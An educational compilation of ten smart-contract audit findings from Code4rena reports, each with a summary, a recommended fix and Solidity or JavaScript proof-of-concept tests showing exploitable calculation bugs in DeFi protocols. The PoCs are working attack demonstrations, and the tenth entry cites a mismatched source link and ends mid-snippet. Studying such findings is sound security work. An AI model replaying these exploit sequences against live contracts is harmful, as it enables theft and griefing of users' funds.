# ETAAcademy-Adudit: 4. Calculation

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>04. Calculation</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>Math</th>
          <td>calculation</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining

## 1.[High] The creation of bad debt (mark-down of Credit) can force other loans in auction to also create bad debt

### Calculating debt during auctions

- Summary: It only records the loan's debt at the start of an auction, using the current `creditMultiplier`. If the creditMultiplier changes during the auction, callDebt may underestimate the actual debt. This could lead to only accepting bids during the auction's second phase if the borrower's debt exceeds available credit. Additionally, if the debt surpasses available credit, bad debt may occur during the auction.
- Impact & Recommendation: All other loans in auction at that time will also be forced to create bad debt. It suggests dynamically calculating callDebt during auctions based on the current creditMultiplier, rather than using a fixed snapshot, for more accurate debt assessment.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#h-03-the-creation-of-bad-debt-mark-down-of-credit-can-force-other-loans-in-auction-to-also-create-bad-debt) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

    // SPDX-License-Identifier: GPL-3.0-or-later
    pragma solidity 0.8.13;
    import {Clones} from "@openzeppelin/contracts/proxy/Clones.sol";
    import {Test} from "@forge-std/Test.sol";
    import {Core} from "@src/core/Core.sol";
    import {CoreRoles} from "@src/core/CoreRoles.sol";
    import {MockERC20} from "@test/mock/MockERC20.sol";
    import {SimplePSM} from "@src/loan/SimplePSM.sol";
    import {GuildToken} from "@src/tokens/GuildToken.sol";
    import {CreditToken} from "@src/tokens/CreditToken.sol";
    import {LendingTerm} from "@src/loan/LendingTerm.sol";
    import {AuctionHouse} from "@src/loan/AuctionHouse.sol";
    import {ProfitManager} from "@src/governance/ProfitManager.sol";
    import {RateLimitedMinter} from "@src/rate-limits/RateLimitedMinter.sol";
    contract BadDebtCreatesBadDebt is Test {
        address private governor = address(1);
        address private guardian = address(2);
        address staker = address(0x01010101);
        address borrower = address(0x02020202);
        address lender = address(0x03030303);
        Core private core;
        ProfitManager private profitManager;
        CreditToken credit;
        GuildToken guild;
        MockERC20 collateral;
        MockERC20 pegToken;
        SimplePSM private psm;
        RateLimitedMinter rlcm;
        AuctionHouse auctionHouse;
        LendingTerm term;
        // LendingTerm params (same as deployment script)
        uint256 constant _CREDIT_PER_COLLATERAL_TOKEN = 1e18; // 1:1
        uint256 constant _INTEREST_RATE = 0.04e18; // 4% APR
        uint256 constant _MAX_DELAY_BETWEEN_PARTIAL_REPAY = 0;
        uint256 constant _MIN_PARTIAL_REPAY_PERCENT = 0;
        uint256 constant _HARDCAP = 2_000_000e18; // 2 million
        uint256 public issuance = 0;
        function setUp() public {
            vm.warp(1679067867);
            vm.roll(16848497);
            core = new Core();
            profitManager = new ProfitManager(address(core));
            collateral = new MockERC20();
            pegToken = new MockERC20(); // 18 decimals for easy calculations (deployment script uses USDC which has 6 decimals)
            credit = new CreditToken(address(core), "name", "symbol");
            guild = new GuildToken(
                address(core),
                address(profitManager)
            );
            rlcm = new RateLimitedMinter(
                address(core) /*_core*/,
                address(credit) /*_token*/,
                CoreRoles.RATE_LIMITED_CREDIT_MINTER /*_role*/,
                0 /*_maxRateLimitPerSecond*/,
                0 /*_rateLimitPerSecond*/,
                uint128(_HARDCAP) /*_bufferCap*/
            );
            auctionHouse = new AuctionHouse(address(core), 650, 1800);
            term = LendingTerm(Clones.clone(address(new LendingTerm())));
            term.initialize(
                address(core),
                LendingTerm.LendingTermReferences({
                    profitManager: address(profitManager),
                    guildToken: address(guild),
                    auctionHouse: address(auctionHouse),
                    creditMinter: address(rlcm),
                    creditToken: address(credit)
                }),
                LendingTerm.LendingTermParams({
                    collateralToken: address(collateral),
                    maxDebtPerCollateralToken: _CREDIT_PER_COLLATERAL_TOKEN,
                    interestRate: _INTEREST_RATE,
                    maxDelayBetweenPartialRepay: _MAX_DELAY_BETWEEN_PARTIAL_REPAY,
                    minPartialRepayPercent: _MIN_PARTIAL_REPAY_PERCENT,
                    openingFee: 0,
                    hardCap: _HARDCAP
                })
            );
            psm = new SimplePSM(
                address(core),
                address(profitManager),
                address(credit),
                address(pegToken)
            );
            profitManager.initializeReferences(address(credit), address(guild), address(psm));
            // roles
            core.grantRole(CoreRoles.GOVERNOR, governor);
            core.grantRole(CoreRoles.GUARDIAN, guardian);
            core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
            core.grantRole(CoreRoles.GUILD_MINTER, address(this));
            core.grantRole(CoreRoles.GAUGE_ADD, address(this));
            core.grantRole(CoreRoles.GAUGE_REMOVE, address(this));
            core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));
            core.grantRole(CoreRoles.CREDIT_MINTER, address(rlcm));
            core.grantRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, address(term));
            core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(term));
            core.grantRole(CoreRoles.CREDIT_MINTER, address(psm));
            core.grantRole(CoreRoles.CREDIT_REBASE_PARAMETERS, address(psm));
            core.renounceRole(CoreRoles.GOVERNOR, address(this));
            // add gauge
            guild.setMaxGauges(10);
            guild.addGauge(1, address(term));
        }
        function testBadDebtCreatesBadDebt() public {
            // staker increases term debtCeiling
            guild.mint(staker, 1000e18);
            vm.startPrank(staker);
            guild.incrementGauge(address(term), 1000e18);
            vm.stopPrank();
            assertEq(guild.getGaugeWeight(address(term)), 1000e18);
            // term has 12 active loans all with various borrow sizes (1_000_000 in total loans)
            // 1st loan = 80_000e18
            collateral.mint(borrower, 1_000_000e18);
            uint256[] memory borrowAmounts = new uint256[](11);
            bytes32[] memory loanIds = new bytes32[](11);
            borrowAmounts[0] = 1_000e18;
            borrowAmounts[1] = 5_000e18;
            borrowAmounts[2] = 10_000e18;
            borrowAmounts[3] = 25_000e18;
            borrowAmounts[4] = 100_000e18;
            borrowAmounts[5] = 50_000e18;
            borrowAmounts[6] = 300_000e18;
            borrowAmounts[7] = 18_000e18;
            borrowAmounts[8] = 90_000e18;
            borrowAmounts[9] = 250_000e18;
            borrowAmounts[10] = 71_000e18;
            vm.prank(borrower);
            collateral.approve(address(term), 1_000_000e18);
            // create 1st loan (loan that will create bad debt)
            bytes32 loanId;
            vm.startPrank(borrower);
            loanId = term.borrow(80_000e18, 80_000e18);
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 13);
            vm.stopPrank();
            // create the rest of the loans (loans that will be forced to create bad debt)
            for (uint256 i; i < borrowAmounts.length; i++) {
                vm.startPrank(borrower);
                loanIds[i] = term.borrow(borrowAmounts[i], borrowAmounts[i]);
                vm.roll(block.number + 1);
                vm.warp(block.timestamp + 13);
                vm.stopPrank();
            }

            assertEq(term.issuance(), 1_000_000e18);
            assertEq(credit.balanceOf(borrower), 1_000_000e18);
            assertEq(credit.totalSupply(), 1_000_000e18);
            // lenders supply 1_000_000 pegToken in psm (credit.totalSupply == 2_000_000)
            pegToken.mint(lender, 1_000_000e18);
            vm.startPrank(lender);
            pegToken.approve(address(psm), 1_000_000e18);
            psm.mintAndEnterRebase(1_000_000e18);
            vm.stopPrank();
            assertEq(credit.totalSupply(), 2_000_000e18);
            // half a year later all loans accrued ~2% interest
            vm.warp(block.timestamp + (term.YEAR() / 2));

            // term is offboarded
            guild.removeGauge(address(term));
            assertEq(guild.isGauge(address(term)), false);
            // one loan is called before the others and it creates bad debt (markdown > % interest owed by other loans)
            term.call(loanId);
            // no ones bids and loan creates bad debt (worse case scenario)
            vm.warp(block.timestamp + auctionHouse.auctionDuration());
            (, uint256 creditAsked) = auctionHouse.getBidDetail(loanId);
            assertEq(creditAsked, 0); // phase 2 ended
            // all loans called via callMany right before bad debt + markdown occurs
            // to demonstrate that any auctions live while markdown occurred would be affected (including auctions in diff terms)
            term.callMany(loanIds);
            // bad debt created, i.e. markdown of 4%
            // note that for demonstration purposes there are no surplus buffers
            auctionHouse.forgive(loanId);
            assertEq(term.issuance(), 1_000_000e18 - 80_000e18);
            assertEq(credit.totalSupply(), 2_000_000e18);
            assertEq(profitManager.creditMultiplier(), 0.96e18); // credit marked down
            // no one can bid during phase 1 of any other loans that were in auction when the markdown occurred
            // due to principle > creditFromBidder, therefore collateral to borrower must be 0, i.e. all collateral is offered, i.e. must be phase 2
            for (uint256 i; i < loanIds.length; i++) {
                ( , creditAsked) = auctionHouse.getBidDetail(loanIds[i]);
                // verify we are in phase 1 (creditAsked == callDebt)
                assertEq(auctionHouse.getAuction(loanIds[i]).callDebt, creditAsked);
                // attempt to bid during phase 1
                credit.mint(address(this), creditAsked);
                credit.approve(address(term), creditAsked);
                vm.expectRevert("LendingTerm: invalid collateral movement");
                auctionHouse.bid(loanIds[i]);
            }
            // fast forward to the beginning of phase 2
            vm.warp(block.timestamp + auctionHouse.midPoint());
            vm.roll(block.number + 1);
            // all other loans that are in auction will be forced to only receive bids in phase 2
            // bad debt is gauranteed to be created for all these loans, so user's are incentivized to
            // bid at the top of phase 2. This would result in the liquidator receiving the collateral at a discount.
            // The loans with less accrued interest and a bigger principle/borrow amount will result in a bigger loss, i.e. greater markdown
            emit log_named_uint("creditMultiplier before updates", profitManager.creditMultiplier());

            uint256 collateralReceived;
            for (uint256 i; i < loanIds.length; i++) {
                (collateralReceived, creditAsked) = auctionHouse.getBidDetail(loanIds[i]);
                // verify we are at the top of phase 2 (collateralReceived == collateralAmount | creditAsked == callDebt)
                assertEq(auctionHouse.getAuction(loanIds[i]).callDebt, creditAsked);
                assertEq(auctionHouse.getAuction(loanIds[i]).collateralAmount, collateralReceived);
                // bid at top of phase two (bidder receives collateral at a discount & protocol incurs more bad debt)
                credit.mint(address(this), creditAsked);
                credit.approve(address(term), creditAsked);
                auctionHouse.bid(loanIds[i]);
                multiplierUpdated();
            }
        }
        function multiplierUpdated() internal {
            // credit multiiplier decreases which each auction
            uint256 multiiplier = profitManager.creditMultiplier();
            emit log_named_uint("creditMultiplier updated", multiiplier);
        }
    }


  ```

  </details>

## 2.[High] Users staking via the SurplusGuildMinter can be immediately slashed when staking into a gauge that had previously incurred a loss

### Initialization user's lastLoss

- Summary: If the gauge has experienced a loss in the past, even if the user staked during a profitable period, they may be immediately slashed upon staking. This happens because the code initializes the user's stake struct with default values, which will identify this user as being slashed, i.e. slashed = true, due to lastGaugeLoss > userStake.lastGaugeLoss.

- Impact: The `SurplusGuildMinter` should initialize a user's **`lastGaugeLoss`** to the current block timestamp, so that comparisons with **`lastGaugeLoss`** won't be made against a freshly initialized user stake struct, preventing potential issues with loss of stake and rewards.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#h-04-users-staking-via-the-surplusguildminter-can-be-immediately-slashed-when-staking-into-a-gauge-that-had-previously-incurred-a-loss) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity
      function testUserImmediatelySlashed() public {
        // initial state
        assertEq(guild.getGaugeWeight(term), 50e18);
        // add credit to surplus buffer
        credit.mint(address(this), 100e18);
        credit.approve(address(profitManager), 50e18);
        profitManager.donateToSurplusBuffer(50e18);
        // term incurs loss
        profitManager.notifyPnL(term, -50e18);
        assertEq(guild.lastGaugeLoss(term), block.timestamp);
        // term offboarded
        guild.removeGauge(term);
        assertEq(guild.isGauge(term), false);
        // time passes and term is re-onboarded
        vm.roll(block.number + 100);
        vm.warp(block.timestamp + (100 * 13));
        guild.addGauge(1, term);
        assertEq(guild.isGauge(term), true);
        // user stakes into term directly
        address user = address(0x01010101);
        guild.mint(user, 10e18);
        vm.startPrank(user);
        guild.incrementGauge(term, 10e18);
        vm.stopPrank();
        // user can un-stake from term
        vm.startPrank(user);
        guild.decrementGauge(term, 10e18);
        vm.stopPrank();
        // user stakes into term via sgm
        credit.mint(user, 10e18);
        vm.startPrank(user);
        credit.approve(address(sgm), 10e18);
        sgm.stake(term, 10e18);
        vm.stopPrank();

        // check after-stake state
        assertEq(credit.balanceOf(user), 0);
        assertEq(profitManager.termSurplusBuffer(term), 10e18);
        assertEq(guild.getGaugeWeight(term), 70e18);
        SurplusGuildMinter.UserStake memory userStake = sgm.getUserStake(user, term);
        assertEq(uint256(userStake.stakeTime), block.timestamp);
        assertEq(userStake.lastGaugeLoss, guild.lastGaugeLoss(term));
        assertEq(userStake.profitIndex, 0);
        assertEq(userStake.credit, 10e18);
        assertEq(userStake.guild, 20e18);
        // malicious actor is aware of bug and slashes the user's stake immediately, despite no loss occurring in the gauge
        sgm.getRewards(user, term);
        // check after-getReward state (user was slashed even though no loss has occurred since term was re-onboarded)
        assertEq(credit.balanceOf(user), 0);
        assertEq(profitManager.termSurplusBuffer(term), 10e18);
        assertEq(guild.getGaugeWeight(term), 70e18);
        userStake = sgm.getUserStake(user, term);
        assertEq(uint256(userStake.stakeTime), 0);
        assertEq(userStake.lastGaugeLoss, 0);
        assertEq(userStake.profitIndex, 0);
        assertEq(userStake.credit, 0);
        assertEq(userStake.guild, 0);
        // user tries to unstake but will not receive anything
        uint256 userBalanceBefore = credit.balanceOf(user);
        vm.startPrank(user);
        sgm.unstake(term, 10e18);
        vm.stopPrank();
        uint256 userAfterBalance = credit.balanceOf(user);
        assertEq(userBalanceBefore, 0);
        assertEq(userAfterBalance, 0);
    }

  ```

  </details>

## 3.[Medium] Anyone can prolong the time for the rewards to get distributed

### Minimum distribution

- Summary: each time the distribute call occurs, the endTimestamp gets extended. An attacker could exploit this by repeatedly calling distribute(1) to distribute 1 wei of a credit token daily, thereby extending the distribution period by approximately three times.

- Impact & Recommendation: Add a minimum required amount for calling distribute if it's not done by the ProfitManager, or change how rewards are interpolated.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-12-anyone-can-prolong-the-time-for-the-rewards-to-get-distributed) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

    function testProlongDistribution() public {
        token.mint(alice, 10e18);
        token.mint(bobby, 20e18);
        vm.prank(alice);
        token.enterRebase();
        vm.prank(bobby);
        token.enterRebase();
        token.mint(address(this), 41e18);
        // Distribute 40 tokens
        uint256 amountToDistribute = 40e18;
        token.distribute(amountToDistribute);

        // Attackers calls distribute(1) each day to only distribute 1 wei of a token
        for(uint256 i = 0; i < 30; i++) {
            vm.warp(block.timestamp + 1 days);
            token.distribute(1);
        }
        uint256 distributedSupply = amountToDistribute - token.pendingDistributedSupply();
        console.log("Distributed supply after 30 days:");
        console.log("----------------------------------------------------");
        console.log("Distributed supply         : ", distributedSupply);
        console.log("Expected distributes supply: ", amountToDistribute);
        for(uint256 i = 0; i < 60; i++) {
            vm.warp(block.timestamp + 1 days);
            token.distribute(1);
        }
        console.log();
        distributedSupply = amountToDistribute - token.pendingDistributedSupply();
        console.log("Distributed supply after 90 days:");
        console.log("----------------------------------------------------");
        console.log("Distributed supply         : ", distributedSupply);
        console.log("Expected distributes supply: ", amountToDistribute);
    }

  ```

  </details>

## 4.[High] Any fee claim lesser than the total yieldFeeBalance as unit of shares is lost and locked in the PrizeVault contract

### Fee claimed less than the accrued balance

- Summary: If the fee claimed is less than the accrued balance, the remaining funds are locked in the PrizeVault with no way to retrieve them.

- Impact & Recommendation: If they claim less than the full amount, they forfeit the remainder, which can lead to loss of funds if not claimed in full. It is recommended to adjust the `claimYieldFeeShares` to only deduct the amount claimed/minted.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-pooltogether#h-01-any-fee-claim-lesser-than-the-total-yieldfeebalance-as-unit-of-shares-is-lost-and-locked-in-the-prizevault-contract) & [Report](https://code4rena.com/reports/2024-03-pooltogether)

  <details><summary>POC</summary>

  ```solidity
    function testUnclaimedFeesLostPOC() public {
        vault.setYieldFeePercentage(1e8); // 10%
        vault.setYieldFeeRecipient(bob); // fee recipient bob
        assertEq(vault.totalDebt(), 0); // no deposits in vault yet
        // alice makes an initial deposit of 100 WETH
        underlyingAsset.mint(alice, 100e18);
        vm.startPrank(alice);
        underlyingAsset.approve(address(vault), 100e18);
        vault.deposit(100e18, alice);
        vm.stopPrank();
        console.log("Shares balance of Alice post mint: ", vault.balanceOf(alice));
        assertEq(vault.totalAssets(), 100e18);
        assertEq(vault.totalSupply(), 100e18);
        assertEq(vault.totalDebt(), 100e18);
        // mint yield to the vault and liquidate
        underlyingAsset.mint(address(vault), 100e18);
        vault.setLiquidationPair(address(this));
        uint256 maxLiquidation = vault.liquidatableBalanceOf(address(underlyingAsset));
        uint256 amountOut = maxLiquidation / 2;
        uint256 yieldFee = (100e18 - vault.yieldBuffer()) / (2 * 10); // 10% yield fee + 90% amountOut = 100%
        vault.transferTokensOut(address(0), bob, address(underlyingAsset), amountOut);
        console.log("Accrued yield post in the contract to be claimed by Bob: ", vault.yieldFeeBalance());
        console.log("Yield fee: ", yieldFee);
        // yield fee: 4999999999999950000
        // alice mint: 100000000000000000000
        assertEq(vault.totalAssets(), 100e18 + 100e18 - amountOut); // existing balance + yield - amountOut
        assertEq(vault.totalSupply(), 100e18); // no change in supply since liquidation was for assets
        assertEq(vault.totalDebt(), 100e18 + yieldFee); // debt increased since we reserved shares for the yield fee
        vm.startPrank(bob);
        vault.claimYieldFeeShares(1e17);

        console.log("Accrued yield got reset to 0: ", vault.yieldFeeBalance());
        console.log("But the shares minted to Bob (yield fee recipient) should be 4.9e18 but he only has 1e17 and the rest is lost: ", vault.balanceOf(bob));
        // shares bob: 100000000000000000
        assertEq(vault.totalDebt(), vault.totalSupply());
        assertEq(vault.yieldFeeBalance(), 0);
        vm.stopPrank();
    }

  ```

  </details>

## 5.[Medium] LiquidInfrastructureERC20.sol disapproved holders keep part of the supply, diluting approved holders revenue

### Dilute revenue

- Summary: Disapproving a holder in the LiquidInfrastructureERC20 contract stops them from receiving revenue, but they still keep part of the token supply, diluting revenue for approved holders. This happens because entitlements per token are calculated based on the total supply and ERC20 balances in the contract.

- Impact & Recommendation: To prevent dilution of revenue, burn tokens of disapproved holders in LiquidInfrastructureERC20. Track their balance at disapproval and mint the same amount upon reapproval.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-althea-liquid-infrastructure#m-01-liquidinfrastructureerc20sol-disapproved-holders-keep-part-of-the-supply-diluting-approved-holders-revenue) & [Report](https://code4rena.com/reports/2024-02-althea-liquid-infrastructure)

  <details><summary>POC</summary>

  ```solidity
    function test_dilutedDistribution() public {
        address nftOwner1 = makeAddr("nftOwner1");
        uint256 rewardAmount1 = 1000000;
        nftOwners = [nftOwner1];
        vm.prank(nftOwner1);
        LiquidInfrastructureNFT nft1 = new LiquidInfrastructureNFT("nftAccount1");
        nfts = [nft1];
        // Register one NFT as a source of reward erc20s
        uint256 accountId = nft1.AccountId();
        thresholdAmounts = [0];
        // Transfer the NFT to ERC20 and manage
        vm.startPrank(nftOwner1);
        nft1.setThresholds(erc20Addresses, thresholdAmounts);
        nft1.transferFrom(nftOwner1, address(infraERC20), accountId);

        vm.stopPrank();
        assertEq(nft1.ownerOf(accountId), address(infraERC20));
        vm.expectEmit(address(infraERC20));
        emit AddManagedNFT(address(nft1));
        vm.startPrank(erc20Owner);
        infraERC20.addManagedNFT(address(nft1));
        vm.roll(1);
        // Allocate rewards to the NFT
        erc20A.transfer(address(nft1), rewardAmount1);
        assertEq(erc20A.balanceOf(address(nft1)), rewardAmount1);
        // And then send the rewards to the ERC20
        infraERC20.withdrawFromAllManagedNFTs();
        // Approve holders
        infraERC20.approveHolder(address(holder1));
        infraERC20.approveHolder(address(holder2));
        // Mint LiquidInfrastructureERC20 tokens to holders
        // 200 total supply of LiquidInfrastructureERC20 tokens
        infraERC20.mint(address(holder1), 100);
        infraERC20.mint(address(holder2), 100);
        // Wait for the minimum distribution period to pass
        vm.roll(vm.getBlockNumber() + 500);
        // Distribute revenue to holders
        infraERC20.distributeToAllHolders();
        console.log("First distribution (2 approved holders) \n  balance of holder 1: %s", erc20A.balanceOf(address(holder1)));
        console.log("balance of holder 2: %s", erc20A.balanceOf(address(holder2)));
        console.log("balance remaining in infraERC20: %s", erc20A.balanceOf(address(infraERC20)));
        // Wait for the minimum distribution period to pass
        vm.roll(vm.getBlockNumber() + 500);
        // Allocate more rewards to the NFT
        erc20A.transfer(address(nft1), rewardAmount1);
        infraERC20.withdrawFromAllManagedNFTs();
        // Holder 2 is no longer approved
        infraERC20.disapproveHolder(address(holder2));
        // Now there is 1 holder remaining, but the rewards are diluted
        infraERC20.distributeToAllHolders();
        console.log("\n  Second distribution (1 approved holder) \n  balance of holder 1: %s", erc20A.balanceOf(address(holder1)));
        console.log("balance of holder 2: %s", erc20A.balanceOf(address(holder2)));
        // There is remaining unallocated rewards in the contract
        console.log("balance remaining in infraERC20: %s", erc20A.balanceOf(address(infraERC20)));
        // holder 2 has 100 LiquidInfrastructureERC20 tokens, this dilutes the rewards
        assertEq(infraERC20.balanceOf(address(holder2)), 100);
        // Wait for the minimum distribution period to pass
        vm.roll(vm.getBlockNumber() + 500);
        // Distribute revenue to holders
        infraERC20.distributeToAllHolders();
        console.log("\n  Third distribution (1 approved holder) \n  balance of holder 1: %s", erc20A.balanceOf(address(holder1)));
        console.log("balance of holder 2: %s", erc20A.balanceOf(address(holder2)));
        console.log("balance remaining in infraERC20: %s", erc20A.balanceOf(address(infraERC20)));
    }

  ```

  </details>

## 6.[High] Improper precision of strike price calculation can result in broken protocol

### Calculation precision

- Summary: Due to precision issues, the protocol's calculation of the strike price for a PUT option on rDPX is flawed. The rounding function used imposes a minimum value, leading to incorrect premium calculations. For instance, a strike price intended to be 25% out-of-the-money (OTM) is rounded up, resulting in an in-the-money (ITM) strike price and inflated premiums.

- Impact & Recommendation: The value of the `roundingPrecision` is too high considering reasonable market prices of ETH and rDPX. Consider decreasing it.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-08-dopex#h-01-improper-precision-of-strike-price-calculation-can-result-in-broken-protocol) & [Report](https://code4rena.com/reports/2023-08-dopex)

  <details><summary>POC</summary>

  ```solidity
    /// @dev the precision to round up to
    uint256 public roundingPrecision = 1e6;

    ...
      uint256 strike = IPerpetualAtlanticVault(addresses.perpetualAtlanticVault)
      .roundUp(rdpxPrice - (rdpxPrice / 4)); // 25% below the current price
    ...

    function roundUp(uint256 _strike) public view returns (uint256 strike) {
        uint256 remainder = _strike % roundingPrecision;
        if (remainder == 0) {
        return _strike;
        } else {
        return _strike - remainder + roundingPrecision;
        }
   }

  ```

  </details>

## 7.[High] The peg stability module can be compromised by forcing lowerDepeg to revert

### update the totalWethDelegated

- Summary: 1) The attacker calls the addToDelegate function and deposits WETH into the rpdxV2Core contract, increasing the totalWethDelegated state variable. 2) Subsequently, the attacker calls the withdraw function, which does not update the totalWethDelegated variable, leaving it inflated. 3) The attacker then calls the sync function, inaccurately updating the WETH reserves by subtracting the inflated totalWethDelegated value. 4) When the admin attempts to restore the dpxETH/ETH peg by calling the lowerDepeg function, it reverts due to an underflow error caused by the manipulated WETH reserves.

- Impact & Recommendation: Update the totalWethDelegated in the `withdraw` function.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-08-dopex#h-08-the-peg-stability-module-can-be-compromised-by-forcing-lowerdepeg-to-revert) & [Report](https://code4rena.com/reports/2023-08-dopex)

  <details><summary>POC</summary>

  ```solidity
      function testOptionPricingRevert() public {
        OptionPricingSimple optionPricingSimple;
        optionPricingSimple = new OptionPricingSimple(100, 5e6);
        (uint256 rdpxRequired, uint256 wethRequired) = rdpxV2Core
            .calculateBondCost(1 * 1e18, 0);
        uint256 currentPrice = vault.getUnderlyingPrice(); // price of underlying wrt collateralToken
        uint256 strike = vault.roundUp(currentPrice - (currentPrice / 4)); // 25% below the current price
        // around 14 minutes before next funding payment
        vm.warp(block.timestamp + 7 days - 863 seconds);
        uint256 timeToExpiry = vault.nextFundingPaymentTimestamp() -
            block.timestamp;
        console.log("What is the current price");
        console.log(currentPrice);
        console.log("What is the strike");
        console.log(strike);
        console.log("What is time to expiry");
        console.log(timeToExpiry);
        uint256 price = vault.getUnderlyingPrice();
        // will revert
        vm.expectRevert();
        optionPricingSimple.getOptionPrice(strike, price, 100, timeToExpiry);
    }

  ```

  </details>

## 8.[High] userTotalStaked invariant will be broken due to vulnerable implementations in release()

### Not properly update the userTotalStaked

- Summary: The release() function in the IdentityStaking contract does not properly update the userTotalStaked invariant, potentially leading to underflow errors in withdraw methods and resulting in users losing funds. This occurs because userTotalStaked is not updated when selfStakes[address].amount or communityStakes[address][x].amount are updated.

- Impact & Recommendation: In `release()`, also update `userTotalStaked`.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-gitcoin#h-01-usertotalstaked-invariant-will-be-broken-due-to-vulnerable-implementations-in-release) & [Report](https://code4rena.com/reports/2024-03-gitcoin)

  <details><summary>POC</summary>

  ```solidity
    it.only("userTotalStaked is broken, user lose funds", async function(){
    //Step2: Round1 - slash Alice's self and community stake of 80000 each
    await this.identityStaking
    .connect(this.owner)
    .slash(
        this.selfStakers.slice(0, 1),
        this.communityStakers.slice(0, 1),
        this.communityStakees.slice(0, 1),
        80,
    );
    //Step2: Round1 - Alice's community/self stake is 20000 after slashing
    expect(
        (
        await this.identityStaking.communityStakes(
            this.communityStakers[0],
            this.communityStakees[0],
        )
        ).amount,
    ).to.equal(20000);
    //Step2: Round1 - total slashed amount 80000 x 2
    expect(await this.identityStaking.totalSlashed(1)).to.equal(160000);
    //Step3: Round1 - Alice appealed and full slash amount is released 80000 x 2
    await this.identityStaking
    .connect(this.owner)
    .release(this.selfStakers[0], this.selfStakers[0], 80000, 1);
    await this.identityStaking
    .connect(this.owner)
    .release(this.communityStakers[0], this.communityStakees[0], 80000, 1);
    //Step3: Round1 - After release, Alice has full staked balance 100000 x 2
    expect((await this.identityStaking.selfStakes(this.selfStakers[0])).amount).to.equal(100000);
    expect((await this.identityStaking.communityStakes(this.communityStakers[0],this.communityStakees[0])).amount).to.equal(100000);
    expect(await this.identityStaking.totalSlashed(1)).to.equal(0);
    // Alice's lock expired
    await time.increase(twelveWeeksInSeconds + 1);
    //Step4: Alice trying to withdraw 100000 x 2 from selfStake and communityStake. Tx reverted with underflow error.
    await  expect((this.identityStaking.connect(this.userAccounts[0]).withdrawSelfStake(100000))).to.be.revertedWithPanic(PANIC_CODES.ARITHMETIC_UNDER_OR_OVERFLOW);
    await  expect((this.identityStaking.connect(this.userAccounts[0]).withdrawCommunityStake(this.communityStakees[0],100000))).to.be.revertedWithPanic(PANIC_CODES.ARITHMETIC_UNDER_OR_OVERFLOW);
    //Step4: Alice could only withdraw 20000 x 2. Alice lost 80000 x 2.
    await this.identityStaking.connect(this.userAccounts[0]).withdrawSelfStake(20000);
    await this.identityStaking.connect(this.userAccounts[0]).withdrawCommunityStake(this.communityStakees[0],20000);
    })

  ```

  </details>

## 9. [Medium] Erroneous probability calculation in physical attributes can lead to significant issues

### Wrong inclusion of boundary

- Summary: The AiArenaHelper contract calculates user attributes using a rarityRank from their DNA. A bug in the dnaToIndex function, which uses cumProb >= rarityRank instead of cumProb > rarityRank, causes the first attribute to be slightly more likely (by 1%) and the last attribute slightly less likely (by 1%) than intended. In cases with extreme probabilities, this can significantly distort the rarity distribution, either doubling the chance of rare attributes or making them impossible to obtain.

- Impact & Recommendation: Correcting it to cumProb > rarityRank results in a 50% chance for both attributes, fixing the imbalance and ensuring accurate probability distribution.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-ai-arena#m-07-erroneous-probability-calculation-in-physical-attributes-can-lead-to-significant-issues) & [Report](https://code4rena.com/reports/2024-02-ai-arena)

  <details><summary>POC</summary>

  ```solidity
                  } else {
                    uint256 rarityRank = (dna / attributeToDnaDivisor[attributes[i]]) % 100;
                    uint256 attributeIndex = dnaToIndex(generation, rarityRank, attributes[i]);
                    finalAttributeProbabilityIndexes[i] = attributeIndex;
                }



     /// @dev Convert DNA and rarity rank into an attribute probability index.
     /// @param attribute The attribute name.
     /// @param rarityRank The rarity rank.
     /// @return attributeProbabilityIndex attribute probability index.
    function dnaToIndex(uint256 generation, uint256 rarityRank, string memory attribute)
        public
        view
        returns (uint256 attributeProbabilityIndex)
    {
        uint8[] memory attrProbabilities = getAttributeProbabilities(generation, attribute);

        uint256 cumProb = 0;
        uint256 attrProbabilitiesLength = attrProbabilities.length;
        for (uint8 i = 0; i < attrProbabilitiesLength; i++) {
            cumProb += attrProbabilities[i];
            if (cumProb >= rarityRank) {
                attributeProbabilityIndex = i + 1;
                break;
            }
        }
        return attributeProbabilityIndex;
    }


  ```

  </details>

## 10. [High] `_vested()` claimable amount calculation error

### `_vested()` calculation

- Summary: The `_vested()` method calculates claimable amounts but doesn't properly consider the `__initialUnlockTimeOffset`, leading to potential overestimations. This flaw can cause calculated results to exceed maximum amounts, leading to unexpected behavior in vesting contracts.
- Impact & Recommendation: Adjust the conditional statement to `if (block.timestamp >= _start -  __initialUnlockTimeOffset + _duration) return _totalAmount; // Fully vested`
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-tapioca#h-10-adversary-can-steal-approved-tolps-to-magnetar-via-_paricipateontolp) & [Report](https://code4rena.com/reports/2024-02-tapioca)

  <details><summary>POC</summary>

  ```solidity
        function _vested(uint256 _totalAmount) internal view returns (uint256) {
            uint256 _cliff = cliff;
            uint256 _start = start;
            uint256 _duration = duration;
            if (_start == 0) return 0; // Not started
            if (_cliff > 0) {
                _start = _start + _cliff; // Apply cliff offset
                if (block.timestamp < _start) return 0; // Cliff not reached
            }
  ```

  -       if (block.timestamp >= _start + _duration) return _totalAmount; // Fully vested

